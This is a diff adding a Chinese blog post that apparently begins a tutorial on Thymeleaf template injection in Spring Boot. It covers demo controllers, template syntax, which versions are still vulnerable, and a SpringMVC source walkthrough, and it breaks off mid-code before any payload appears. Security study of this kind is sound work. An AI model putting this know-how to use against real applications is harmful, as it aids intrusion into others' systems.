@@ -1,0 +1,403 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>thymeleaf模板注入 | clown</title><meta name="author" content="clown"><meta name="copyright" content="clown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近实在是不知道看什么了，来学一下和java相关的一些ssti吧，先从thymeleaf开始 介绍Thymeleaf就是一个模板渲染引擎，和python的jinjia2一样，就不需要过多介绍了 官方文档：https:&#x2F;&#x2F;www.thymeleaf.org&#x2F;documentation.html 高版本SpringBoot&#x2F;Thymeleaf不存在模板注入问题，这里SpringBoot版本为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thymeleaf模板注入">
+<meta property="og:url" content="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="clown">
+<meta property="og:description" content="最近实在是不知道看什么了，来学一下和java相关的一些ssti吧，先从thymeleaf开始 介绍Thymeleaf就是一个模板渲染引擎，和python的jinjia2一样，就不需要过多介绍了 官方文档：https:&#x2F;&#x2F;www.thymeleaf.org&#x2F;documentation.html 高版本SpringBoot&#x2F;Thymeleaf不存在模板注入问题，这里SpringBoot版本为">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.clown2024.cn/202407151814125.jpg">
+<meta property="article:published_time" content="2024-12-12T16:09:58.000Z">
+<meta property="article:modified_time" content="2024-12-13T16:58:34.139Z">
+<meta property="article:author" content="clown">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.clown2024.cn/202407151814125.jpg"><link rel="shortcut icon" href="http://cdn.clown2024.cn/202407151818951.jpeg"><link rel="canonical" href="https://clowsman.github.io/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'thymeleaf模板注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-14 00:58:34'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="clown" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://cdn.clown2024.cn/202407151814125.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.clown2024.cn/illust_37614504_20210816_090201.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">thymeleaf模板注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-12T16:09:58.000Z" title="发表于 2024-12-13 00:09:58">2024-12-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-13T16:58:34.139Z" title="更新于 2024-12-14 00:58:34">2024-12-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java/">java</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="thymeleaf模板注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近实在是不知道看什么了，来学一下和java相关的一些ssti吧，先从thymeleaf开始</p>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Thymeleaf就是一个模板渲染引擎，和python的jinjia2一样，就不需要过多介绍了</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p>
+<p>高版本SpringBoot&#x2F;Thymeleaf不存在模板注入问题，这里SpringBoot版本为2.5.10(实测得2.4.1，2.5.10已经不行了)，Thymeleaf同上</p>
+<h1 id="demo示例"><a href="#Demo示例" class="headerlink" title="Demo示例"></a>Demo示例</h1><p>首先就是创建一个springboot项目，我们的thymeleaf文件就写在templates目录下</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213110130755.png" alt="image-20241213110130755"></p>
+<p>创建项目的时候可以勾选thymeleaf模板引擎</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213110353299.png" alt="image-20241213110353299"></p>
+<p>一个基础的index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>hello 第一个Thymeleaf程序<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>controller</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/demo&quot;)</span><br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里需要用<code>@Controller</code>注解才行，因为该注解主要作用是返回视图名称，这些视图名称会被Spring的视图解析器（View Resolver）解析，从而找到对应的模板文件（如Thymeleaf模板），并将模型数据渲染到模板中，最终生成响应给客户端的视图。</p>
+<p><code>@RestController</code>注解是<code>@Controller</code>和<code>@ResponseBody</code>的组合，它通常用于创建RESTful Web服务。<code>@RestController</code>注解的控制器方法的返回值会自动作为HTTP响应的正文返回，这意味着返回值不会被视图解析器处理，而是直接写入HTTP响应体中。</p>
+<h1 id="一些语法"><a href="#一些语法" class="headerlink" title="一些语法"></a>一些语法</h1><p>thymeleaf的html文件首先要包含这个</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>标签</strong></p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>作用</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>th:id</td>
+<td>替换id</td>
+<td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td>
+</tr>
+<tr>
+<td>th:text</td>
+<td>文本替换</td>
+<td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th:utext</td>
+<td>支持html的文本替换</td>
+<td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td>
+</tr>
+<tr>
+<td>th:object</td>
+<td>替换对象</td>
+<td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td>
+</tr>
+<tr>
+<td>th:value</td>
+<td>替换值</td>
+<td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th:each</td>
+<td>迭代</td>
+<td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td>
+</tr>
+<tr>
+<td>th:href</td>
+<td>替换超链接</td>
+<td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;超链接&lt;/a&gt;</code></td>
+</tr>
+<tr>
+<td>th:src</td>
+<td>替换资源</td>
+<td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td>
+</tr>
+</tbody></table>
+<p><strong>链接表达式</strong></p>
+<p>使用<code>@&#123;资源地址&#125;</code>引入资源，引入的地址可以在static目录，也可以是互联网的资源，格式如上面的标签示例</p>
+<p><strong>变量表达式</strong></p>
+<p>这部分也是页面能动态渲染的核心，可以用<code>$&#123;...&#125;</code>的形式在model中取值，前面的demo中也可以看到我们往model中添加了属性的键值对</p>
+<p>取JavaBean对象使用<code>$&#123;对象名.对象属性&#125;</code>或者<code>$&#123;对象名[&#39;对象属性&#39;]&#125;</code>来取值。如果JavaBean写了get方法也可以通过<code>$&#123;对象.get方法名&#125;</code>取值。</p>
+<p>取Map对象使用<code>$&#123;Map名[&#39;key&#39;]&#125;</code>或<code>$&#123;Map名.key&#125;</code></p>
+<p>取List集合：List集合是一个有序列表，需要使用each遍历赋值，<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p>
+<p><strong>选择变量表达式</strong></p>
+<p>该表达式的写法为*{…}，写个例子就明白了</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>赛<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>好好学习<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">user</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;clown&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20241213143906940.png" alt="image-20241213143906940"></p>
+<p><strong>消息表达式</strong></p>
+<p>文本外部化是从模板文件中提取模板代码的片段，以便可以将它们保存在单独的文件(通常是.properties文件)中,文本的外部化片段通常称为“消息”。通俗易懂的来说<code>#&#123;…&#125;</code>语法就是用来读取配置文件中数据的。</p>
+<p>这里也写个例子更好体会，首先在templates目录下建立<code>clown.properties</code>中写入以下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">demo.nane=clown<br>demo.age=22<br>province=UnKnown<br></code></pre></td></tr></table></figure>
+
+<p>然后在application.properties加入下面内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">spring.messages.basename=templates/demo<br></code></pre></td></tr></table></figure>
+
+<p>html内容如下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.age&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.nane&#125;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Province: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;province&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p><img src="https://cdn.clown2024.cn/image-20241213145707765.png" alt="image-20241213145707765"></p>
+<p><strong>片段表达式</strong></p>
+<p>片段表达式<code>~&#123;...&#125;</code>可以用于引用公共的目标片段，比如可以在一个<code>template/public.html</code>中定义下面的片段,并在另一个template中引用。</p>
+<p>公共片段：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    © 2011 The Good Thymes Virtual Grocery<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>引用公共片段：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;public :: copy&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.clown2024.cn/image-20241213175923703.png" alt="image-20241213175923703"></p>
+<h1 id="springmvc视图解析过程"><a href="#SpringMVC视图解析过程" class="headerlink" title="SpringMVC视图解析过程"></a>SpringMVC视图解析过程</h1><p>视图解析的过程是发生在Controller处理后，Controller处理结束后会将返回的结果封装为<code>ModelAndView</code>对象，再通过视图解析器<code>ViewResovler</code>得到对应的视图并返回。</p>
+<p>给一张SpringMVC的执行流程图</p>
+<p><img src="http://cdn.clown2024.cn/202407270110622.png" alt="image-20240727011007456"></p>
+<p>我们可以用前面的demo跟进调试一下，看一下视图是如何解析的</p>
+<h2 id="封装modelandview对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h2><p>先走到<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，其源码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">			Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>		<span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>		setResponseStatus(webRequest);<br><br>		<span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>			<span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>				disableContentCachingIfNecessary(webRequest);<br>				mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>				<span class="hljs-keyword">return</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>			mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br><br>		mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>		